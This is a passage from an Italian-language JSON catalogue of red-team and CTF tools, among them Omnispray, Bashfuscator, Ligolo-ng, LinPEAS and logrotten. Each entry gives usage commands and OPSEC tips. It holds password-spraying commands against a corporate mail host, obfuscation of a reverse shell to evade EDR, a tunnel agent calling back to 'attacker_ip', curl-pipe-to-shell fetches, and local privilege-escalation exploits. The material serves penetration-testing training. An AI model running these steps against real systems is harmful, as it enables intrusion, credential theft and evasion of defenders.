    "desc": "Wordlist curata specificamente per le challenge HackTheBox: directory, file e credenziali ricorrenti nei lab CTF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTB-wordlist</strong> non è un singolo file ma una selezione di dizionari che la community di HackTheBox ha identificato come \"must-have\" per risolvere le macchine della piattaforma. Contiene percorsi web, nomi di file e password che appaiono frequentemente nei laboratori CTF, ottimizzando i tempi di bruteforce rispetto a liste enormi come `directory-list-2.3-medium`.</p><br><hr><h4 class=\"rt-purple\">Caratteristiche</h4><p><strong>Contesto CTF:</strong> Le liste sono pulite da entry inutili per ambienti simulati e arricchite con termini \"troll\" o specifici che i creatori di challenge amano usare.</p><p><strong>Efficienza:</strong> Progettate per dare risultati veloci (Hit rate alto) su macchine vulnerabili intenzionalmente, riducendo il tempo di scansione con Gobuster o Feroxbuster.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come primo step nelle challenge HTB.</p><pre><code># Directory busting su macchina HTB\ngobuster dir -u http://10.10.10.x -w htb-directories.txt\n\n# Fuzzing vhost\nffuf -u http://10.10.10.x -H \"Host: FUZZ.box.htb\" -w htb-subdomains.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Esclusivamente per <strong>CTF e Training</strong>. In un pentest reale, queste liste potrebbero essere troppo limitate o specifiche (\"CTF-isms\") e mancare di copertura per software enterprise reali.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non affidarsi solo a queste per assessment reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "omnispray",
    "name": "Omnispray",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0xZDH/Omnispray",
    "desc": "Tool modulare per password spraying con gestione avanzata di target multipli, delay randomizzato e output strutturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Omnispray</strong> è un framework progettato per semplificare e rendere più sicuro il password spraying su larga scala. A differenza di script one-off, offre una gestione centralizzata dei target e delle credenziali testate, con funzionalità robuste per evitare lockout e rilevamento.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Safety Controls:</strong> Implementa jitter (ritardi casuali) tra le richieste e stop automatici in caso di troppi errori consecutivi, per mimetizzarsi nel traffico normale.</p><p><strong>Target multipli:</strong> Può attaccare simultaneamente diversi servizi (O365, OWA, VPN, SSH) usando moduli specifici, riutilizzando la stessa lista utenti.</p><p><strong>Reporting:</strong> Genera log puliti e file CSV con le credenziali valide, pronti per la fase successiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare il target e lanciare lo spray.</p><pre><code># Spraying base su OWA\npython3 omnispray.py --module owa --target https://mail.corp.com --users users.txt --password \"Fall2024!\"\n\n# Spraying con delay elevato (stealth)\npython3 omnispray.py --module ssh --target 192.168.1.0/24 --users users.txt --password \"Password123\" --delay 30-60</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon:</strong> Testare le difese perimetrali (VPN, Webmail) con una singola password comune senza rischiare di bloccare l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche con delay, il volume di login falliti da un singolo IP è sospetto. Usare in combinazione con proxy rotation (es. FireProx) se supportato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "statistically-likely-usernames",
    "name": "statistically-likely-usernames",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/insidetrust/statistically-likely-usernames",
    "desc": "Generatore di wordlist username basato su dati di censimento e pattern aziendali (nome.cognome, iniziali) per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Non è un software, ma una risorsa/metodologia per generare liste di username ad alta probabilità. Sfrutta dataset pubblici (nomi e cognomi più diffusi per nazionalità) e li combina con formati username standard (es. <code>m.rossi</code>, <code>mario.rossi</code>, <code>rossim</code>). Questo approccio statistico aumenta drasticamente il successo del password spraying e dell'enumerazione utenti riducendo il numero di richieste inutili verso account inesistenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dataset Reali:</strong> Include liste di nomi maschili/femminili e cognomi basati su dati di censimento USA, UK, e altri paesi, ordinati per frequenza.</p><p><strong>Pattern Generation:</strong> Script o logiche per permutare nomi e cognomi nei formati più usati dalle aziende (jsmith, john.s, smithj, ecc.).</p><p><strong>Efficienza:</strong> Permette di colpire il \"top 5%\" degli utenti probabili (es. i 100 cognomi più comuni coprono una grossa fetta della popolazione), ottimizzando il tempo di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa offline per preparare la lista target prima dell'attacco.</p><pre><code># Generazione lista username (esempio concettuale con tool di supporto)\n./generate-usernames.sh --format first.last --top 1000 > targets.txt\n\n# Uso con Kerbrute\nkerbrute userenum -d domain.local targets.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale in fasi di <strong>Recon Black-Box</strong> esterna quando non si hanno liste dipendenti. Combinato con LinkedIn scraping (per trovare i nomi reali), questo tool aiuta a indovinare il formato username aziendale (es. testando 10 dipendenti noti) e poi generare una lista massiva per l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'accuratezza dipende dalla nazionalità del target. Usare liste anglosassoni su un'azienda italiana produrrà risultati scarsi. Necessita di localizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "username-anarchy-0-6",
    "name": "username-anarchy",
    "version": "0.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/urbanadventurer/username-anarchy",
    "desc": "Tool per generare liste di username basate su nomi reali, permutando formati comuni (j.doe, doe.j) per attacchi mirati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Username Anarchy risolve il problema di indovinare il formato degli username aziendali. Partendo da una lista di nomi e cognomi reali (es. ottenuta da LinkedIn), genera tutte le possibili permutazioni standard utilizzate dalle aziende (flast, first.last, f.last, ecc.). È essenziale per preparare liste di alta qualità per password spraying o phishing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Permutation:</strong> Supporta decine di formati (Facebook style, Corporate standard) e sostituzioni (es. 'ø' -> 'o').</p><p><strong>Format Recognition:</strong> Se fornito di alcuni username noti, può tentare di dedurre il formato usato dall'azienda e generare gli altri di conseguenza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CLI Ruby.</p><pre><code># Generazione massiva da lista nomi\n./username-anarchy -i fullnames.txt > userlist.txt\n\n# Generazione formato specifico (es. j.doe)\n./username-anarchy -f first.last Mario Rossi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Recon & Spraying:</strong> Per trasformare i dati OSINT (nomi dipendenti) in dati operativi (username validi) prima di lanciare un attacco Kerbrute o O365 spray.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Tool offline, nessun impatto OPSEC diretto. L'accuratezza della lista generata riduce il rumore degli attacchi successivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "bashfuscator",
    "name": "Bashfuscator",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Bashfuscator/Bashfuscator",
    "desc": "Framework avanzato per offuscare script Bash rendendoli illeggibili e bypassando rilevamenti statici/signature-based.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bashfuscator</strong> è uno strumento potente per rendere incomprensibili gli script Bash e i payload Linux. Utilizza varie tecniche di manipolazione delle stringhe, encoding e logiche contorte per generare script funzionalmente identici all'originale ma completamente diversi nella forma, bypassando analisi statiche e filtri IDS che cercano keyword specifiche (es. <code>wget</code>, <code>nc -e</code>).</p><br><hr><h4 class=\"rt-purple\">Tecniche di offuscamento</h4><p><strong>Layering:</strong> Applica molteplici strati di offuscamento (es. Base64 -> AES -> XOR -> Reverse) che vengono decifrati a runtime dallo script stesso.</p><p><strong>Token Manipulation:</strong> Spezza i comandi in pezzi e usa variabili randomiche per ricostruirli (es. <code>c=\"l\"; a=\"s\"; $a$c -la</code>).</p><p><strong>Polimorfismo:</strong> Genera un output diverso ogni volta che viene eseguito, rendendo inutile la creazione di firme hash statiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Passare lo script o il comando da offuscare.</p><pre><code># Offuscamento di un one-liner\n./bashfuscator -c \"cat /etc/passwd\" -o payload.sh\n\n# Offuscamento di uno script file con 2 layer random\n./bashfuscator -f reverse_shell.sh -l 2 --choose-mutators random</code></pre><p>L'output è uno script bash pronto da eseguire sul target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, è vitale per bypassare controlli di sicurezza che ispezionano script caricati o comandi eseguiti (es. auditd logs, EDR Linux). Utile per nascondere la logica di un payload di persistenza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli script offuscati hanno spesso un'entropia molto alta o usano costrutti <code>eval</code> sospetti che i moderni EDR possono flaggare euristicamente come \"obfuscated script\". Testare sempre in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng",
    "name": "Ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nicocha30/ligolo-ng",
    "desc": "Tool di tunneling/pivoting moderno che usa interfacce TUN per routing completo (TCP/UDP/ICMP) senza bisogno di SOCKS proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-ng</strong> rappresenta l'evoluzione del pivoting. A differenza dei tradizionali proxy SOCKS (come Chisel o SSH -D) che gestiscono solo connessioni TCP e richiedono \"proxychains\", Ligolo-ng crea un'interfaccia di rete virtuale (TUN) sulla macchina dell'attaccante. Questo permette di instradare <strong>tutto</strong> il traffico di rete (inclusi SYN scan, UDP, ICMP ping) verso la rete interna compromessa in modo trasparente, come se si fosse collegati in VPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full VPN-like Experience:</strong> Permette di usare tool come Nmap (con OS detection), Masscan o Kerberos tools senza wrapper o configurazioni proxy complesse.</p><p><strong>User-Space Execution:</strong> L'agent sul target gira in user-space (non richiede driver o privilegi amministrativi per funzionare, anche se privilegiati servono per alcune feature di rete avanzate).</p><p><strong>Reverse Tunneling:</strong> L'agent si connette al proxy dell'attaccante, bypassando firewall che bloccano connessioni in ingresso (bind shells).</p><p><strong>Certificati Let's Encrypt:</strong> Supporta gestione automatica certificati SSL per cifrare il traffico del tunnel e mascherarlo come HTTPS legittimo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Setup: Proxy sulla macchina attaccante, Agent sulla vittima.</p><pre><code># Attaccante (Setup interfaccia e listener)\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert\n\n# Vittima (Connect back)\n./agent -connect attacker_ip:11601 -ignore-cert\n\n# Attaccante (Nella console ligolo)\nsession 1\nstart\n# Aggiunta rotta sul sistema attaccante\nsudo ip route add 192.168.50.0/24 dev ligolo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Deep Network Pivoting</strong>. Se comprometti un server web esposto e vuoi scansionare la rete interna database con Nmap <code>-sS</code> (SYN scan) o eseguire attacchi UDP (es. Kerberoasting, SNMP), Ligolo-ng è superiore a qualsiasi proxy SOCKS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico è cifrato (TLS), ma una connessione persistente a lungo termine verso un IP esterno è sospetta (Beaconing). L'agent in memoria è un eseguibile Go che può essere firmato da EDR.</p><p><strong>Mitigazioni:</strong> Usare redirector https legittimi davanti al proxy. Rinominare l'agent.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linenum",
    "name": "LinEnum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/rebootuser/LinEnum",
    "desc": "Script Bash per privilege escalation enumeration su Linux: verifica kernel, SUID/GUID, cron jobs, config files e permessi errati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LinEnum</strong> è uno dei primi e più diffusi script di enumerazione automatica per sistemi Linux. Esegue una batteria di oltre 60 controlli per identificare vettori comuni di escalation dei privilegi locali. È progettato per essere eseguito \"senza installazione\" (basta lo script bash) e fornisce un report dettagliato evidenziando (in giallo/rosso/magenta) le configurazioni più promettenti per ottenere root.</p><br><hr><h4 class=\"rt-purple\">Controlli principali</h4><p><strong>Kernel & Distribution:</strong> Identifica versione OS e Kernel per cercare exploit locali noti (es. DirtyCow).</p><p><strong>Permessi & Capabilities:</strong> Cerca file con bit SUID/SGID attivi, file scrivibili da \"world\" o gruppo, e capabilities POSIX anomale assegnate a eseguibili.</p><p><strong>Servizi & Job:</strong> Enumera processi girano come root, cron job (task pianificati) leggibili o modificabili, e timer di systemd.</p><p><strong>Credenziali:</strong> Cerca password in chiaro in file di config, history della shell, chiavi SSH e file <code>.plan</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Copiare lo script sul target ed eseguirlo. Non richiede privilegi root.</p><pre><code># Esecuzione base con output a video\n./LinEnum.sh\n\n# Esecuzione approfondita (keyword search, test extra) e output file\n./LinEnum.sh -k password -e /tmp/ -t -r report.txt\n\n# Esecuzione memory-only (via curl)\ncurl -L https://raw.githubusercontent.com/.../LinEnum.sh | bash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il primo step dopo aver ottenuto una shell <strong>Low Privilege</strong> su Linux. Risolve il problema del \"non so cosa cercare\", fornendo in pochi secondi una lista di potenziali vulnerabilità (es. un binario SUID di <code>nmap</code> vecchio, o un cron job che esegue uno script scrivibile dal tuo utente).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LinEnum tocca migliaia di file in pochi secondi (scan filesystem). Questo genera un picco di I/O e accessi (atime updates) estremamente rumoroso. I comandi eseguiti finiscono nell'audit log.</p><p><strong>Mitigazioni:</strong> In ambienti monitorati, eseguire controlli manuali mirati invece dello script completo. Usare la redirezione output su <code>/dev/shm</code> (RAM disk) per evitare scritture su disco fisico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "logrotten-2-1",
    "name": "logrotten",
    "version": "2.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/whotwagner/logrotten",
    "desc": "Exploit PoC per race condition in logrotate che permette Privilege Escalation da utente log a root.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>logrotten</strong> è un exploit che sfrutta una vulnerabilità di Race Condition nel tool di sistema <code>logrotate</code>. Se logrotate è configurato per gestire log in directory controllate dall'utente (o scrivibili), l'exploit permette di sostituire il file di log con un symlink o un payload maligno nell'istante esatto in cui logrotate esegue le operazioni, ottenendo esecuzione di codice come root.</p><br><hr><h4 class=\"rt-purple\">Meccanismo</h4><p><strong>Race Condition:</strong> Monitora il file di log target. Quando logrotate inizia a rinominare/comprimere il file, logrotten scambia il file con un symlink a una directory sensibile (es. <code>/etc/bash_completion.d/</code>).</p><p><strong>Payload Injection:</strong> Se la race condition vince, logrotate scrive o sposta il payload dell'attaccante nella directory di sistema, che verrà poi eseguito da root o da altri utenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede compilazione del binario C sul target.</p><pre><code># Compilazione\ngcc logrotten.c -o logrotten\n\n# Esecuzione (richiede un file di log vulnerabile)\n./logrotten -p ./payload.sh /tmp/vulnerable.log</code></pre><p>Spesso richiede di forzare la rotazione dei log o attendere il cron job giornaliero.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Specifico per <strong>Linux Privilege Escalation</strong>. Utile quando si ha accesso come utente di servizio (es. <code>www-data</code> o <code>mysql</code>) che ha permessi di scrittura sui propri log, e logrotate gira come root.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione dell'exploit può fallire più volte, lasciando tracce di file corrotti o symlink anomali. È un attacco attivo e rischioso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "one-gadget-1-10-0",
    "name": "OneGadget",
    "version": "1.10.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/david942j/one_gadget",
    "desc": "Tool per binary exploitation che trova indirizzi ROP nella libc per eseguire execve('/bin/sh') con un singolo salto.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OneGadget</strong> è uno strumento fondamentale per lo sviluppo di exploit su Linux (CTF e reale). Cerca all'interno di una libreria <code>libc</code> condivisa gli offset di specifici frammenti di codice (\"gadget\") che, se eseguiti, portano direttamente all'esecuzione di una shell (<code>/bin/sh</code>). Questo semplifica drasticamente la costruzione di catene ROP, riducendo l'exploit a un singolo overwrite dell'instruction pointer se le condizioni sono soddisfatte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Constraint Analysis:</strong> Per ogni gadget trovato, elenca i vincoli sui registri (es. <code>rax == NULL</code>) che devono essere veri al momento del salto affinché l'exploit funzioni.</p><p><strong>Libc Database:</strong> Funziona su qualsiasi versione di libc fornita, permettendo di adattare l'exploit alla versione esatta del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire contro il file .so della libc.</p><pre><code># Trova gadget\none_gadget /lib/x86_64-linux-gnu/libc.so.6</code></pre><p>Output esempio: <code>0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp & 0xf == 0</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Binary Exploitation:</strong> Quando si ha un buffer overflow e un leak dell'indirizzo base della libc, OneGadget fornisce l'indirizzo a cui saltare per vincere istantaneamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Funziona solo se si conosce o si può leakare la versione della libc del sistema remoto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DominicBreuker/pspy",
    "desc": "Monitor di processi Linux senza privilegi di root: intercetta comandi, cron job, uid e guid in tempo reale via procfs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pspy</strong> è uno strumento di command-line monitoring per Linux progettato per funzionare senza permessi di root. Sfrutta il file system <code>/proc</code> per scansionare continuamente i processi in esecuzione e catturare eventi di breve durata che sfuggirebbero a strumenti statici come <code>ps</code>. È la risorsa primaria per individuare cron job nascosti, script eseguiti da altri utenti e credenziali passate come argomenti da riga di comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cron Job Snooping:</strong> Rileva processi che vengono avviati periodicamente (tipico dei cron job). Vedere <em>cosa</em> viene eseguito e <em>con quali privilegi</em> (UID) è fondamentale per trovare vettori di Privilege Escalation (es. un cron job di root che esegue uno script scrivibile).</p><p><strong>Capture Argomenti:</strong> Cattura l'intera riga di comando dei processi. Questo permette di intercettare password, chiavi API o percorsi di file sensibili passati come argomenti a programmi in esecuzione.</p><p><strong>File System Monitoring:</strong> Utilizza <code>inotify</code> per monitorare eventi sul file system (accedibili dall'utente corrente), aiutando a correlare l'esecuzione di processi con la creazione/modifica di file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare il binario statico (disponibile per 32/64 bit) sulla macchina vittima ed eseguirlo.</p><pre><code># Esecuzione standard\n./pspy64\n\n# Monitoraggio specifico su una cartella e output su file\n./pspy64 -f -r /var/www/html -o events.log\n\n# Filtro per PID specifici (es. per monitorare cosa fa un demone)\n./pspy64 -p 1234</code></pre><p>L'output scorre in tempo reale, mostrando PID, UID, e comando completo colorati per leggibilità.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per la <strong>Linux Privilege Escalation</strong>. Se si è ottenuto un accesso low-privilege, pspy viene lasciato girare per rilevare automazioni di sistema. Esempio classico: rilevare un backup script eseguito ogni minuto da root che usa <code>tar *</code>, sfruttabile tramite wildcard injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> pspy genera un carico CPU notevole a causa del polling continuo su <code>/proc</code>. In ambienti monitorati, questo comportamento anomalo (high CPU usage da un processo sconosciuto) è facilmente rilevabile.</p><p><strong>Mitigazioni:</strong> Usare intervalli di polling più lunghi (flag <code>-i</code>) per ridurre il carico CPU, anche se si rischia di perdere processi molto veloci.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "screen-exploit-poc",
    "name": "screen-exploit-poc.sh",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Bash PoC per sfruttare vulnerabilità di Privilege Escalation locale in GNU Screen (es. CVE-2017-5618).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta vulnerabilità storiche nel binario <code>screen</code> (terminal multiplexer), spesso installato con bit SUID su Linux. Versioni vulnerabili permettono a un utente locale di creare file con permessi di root (log file manipulation) o eseguire codice arbitrario tramite buffer overflow o race conditions durante l'apertura di nuovi screen.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Root File Write:</strong> Abusa della funzionalità di logging di Screen per sovrascrivere file sensibili (es. <code>/etc/ld.so.preload</code>) con contenuto controllato dall'attaccante, forzando il caricamento di librerie malevole.</p><p><strong>Privilege Escalation:</strong> Risultato finale è una shell root partendo da utente low-priv.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire sulla macchina target.</p><pre><code># Compilazione libreria malevola e esecuzione exploit\n./screen-exploit-poc.sh</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Linux Local Privesc:</strong> Utile su sistemi legacy o non patchati dove Screen 4.5.0 o inferiori sono presenti. Classico da CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'exploit spesso corrompe file di configurazione. Rischioso su produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "PEASS-ng",
    "version": "20250904-27f4363e",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/peass-ng/PEASS-ng",
    "desc": "Privilege Escalation Awesome Scripts Suite (LinPEAS/WinPEAS): suite definitiva per enumerazione automatica vettori di privesc.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PEASS-ng</strong> è la raccolta standard de-facto per l'enumerazione locale post-exploitation. Include <strong>LinPEAS</strong> (Linux) e <strong>WinPEAS</strong> (Windows). Questi script eseguono una scansione esaustiva del sistema alla ricerca di misconfigurazioni, file sensibili, credenziali, vulnerabilità kernel e servizi sfruttabili per elevare i privilegi da utente standard a Root/SYSTEM. L'output colorato facilita l'identificazione immediata delle criticità (Rosso/Giallo = alta probabilità).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Checks:</strong> Verifica migliaia di vettori: permessi file, SUID, sudo rights, registry keys, servizi non quotati, DLL hijacking, processi in ascolto, versioni software vulnerabili.</p><p><strong>Credential Hunting:</strong> Cerca aggressivamente password in file di config, cronologia, database locali e memory dump.</p><p><strong>Cloud Awareness:</strong> Rileva se il sistema è in un ambiente cloud (AWS, Azure, GCP) e cerca metadati o credenziali cloud specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare ed eseguire lo script sulla macchina target.</p><pre><code># Linux (curl e pipe bash)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows (eseguibile o bat)\nwinpeas.exe domain users\n\n# Modalità stealth/fast\n./linpeas.sh -s (superfast/stealth)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Lo strumento #1 da lanciare dopo aver ottenuto una shell. Risparmia ore di enumerazione manuale. Ottimo anche per <strong>Hardening Audits</strong> per trovare buchi di sicurezza nei propri server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PEASS è molto rumoroso e conosciuto da tutti gli AV/EDR. LinPEAS tocca troppi file. WinPEAS viene quasi sempre cancellato da Defender.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate, eseguire solo check specifici o in memoria. In ambienti monitorati, usare l'enumerazione manuale guidata dai risultati di PEASS in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "ghidra-11-4-2-public",
    "name": "Ghidra",
    "version": "11.4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NationalSecurityAgency/ghidra",
    "desc": "Suite di Reverse Engineering open-source della NSA: disassembler, decompiler e debugger multi-architettura con scripting Java/Python.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ghidra</strong> è una piattaforma software di reverse engineering (SRE) sviluppata dal Research Directorate della NSA. Offre un ambiente completo per l'analisi di file binari (malware, firmware, eseguibili) su una vasta gamma di architetture (x86, ARM, MIPS, PowerPC, ecc.). La sua caratteristica più potente è il <strong>Decompiler</strong> avanzato, che ricostruisce una rappresentazione simil-C del codice assembly, rendendo l'analisi comprensibile anche senza conoscere a fondo l'assembly specifico.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Code Analysis:</strong> Esegue analisi automatica del binario per identificare funzioni, stringhe, chiamate di sistema e strutture dati. Il grafo di flusso (Function Graph) visualizza logicamente i percorsi di esecuzione.</p><p><strong>Collaborazione:</strong> Supporta il reverse engineering in team: più analisti possono lavorare sullo stesso progetto in tempo reale, condividendo annotazioni, rinomine di variabili e scoperte tramite un server centralizzato.</p><p><strong>Scripting & Estensibilità:</strong> Permette di automatizzare task ripetitivi tramite script in Java o Python. È possibile scrivere analizzatori custom per decifrare stringhe offuscate o risolvere importazioni dinamiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ghidra è un'applicazione GUI Java. Si crea un progetto, si importa il file e si lancia l'Auto Analyze.</p><pre><code># Workflow tipico (GUI)\n1. File -> New Project\n2. Import File (drag & drop del malware/eseguibile)\n3. Double click per aprire nel CodeBrowser\n4. \"Yes\" alla richiesta di Auto Analyze\n5. Navigare il Decompiler window per leggere il codice \"C-like\"</code></pre><p>Esiste anche una modalità \"Headless\" per analisi batch da riga di comando: <code>analyzeHeadless projectPath projectName -import binaryFile</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale per <strong>Malware Analysis</strong> (capire cosa fa un ransomware), <strong>Vulnerability Research</strong> (trovare buffer overflow in software chiusi) e <strong>CTF</strong>. È l'alternativa gratuita e potente a IDA Pro. Utile anche per analizzare firmware di dispositivi IoT per trovare hardcoded credentials.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede JDK installato. L'analisi automatica può impiegare molto tempo su binari grandi. Attenzione quando si analizza malware reale: eseguire sempre in una VM isolata, poiché Ghidra esegue il parsing di formati file complessi che potrebbero teoricamente contenere exploit contro il tool stesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwninit-3-3-1",
    "name": "pwninit",
    "version": "3.3.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/io12/pwninit",
    "desc": "Tool per automatizzare il setup di challenge di Binary Exploitation (CTF): scarica linker, patcha ELF e genera template exploit.",
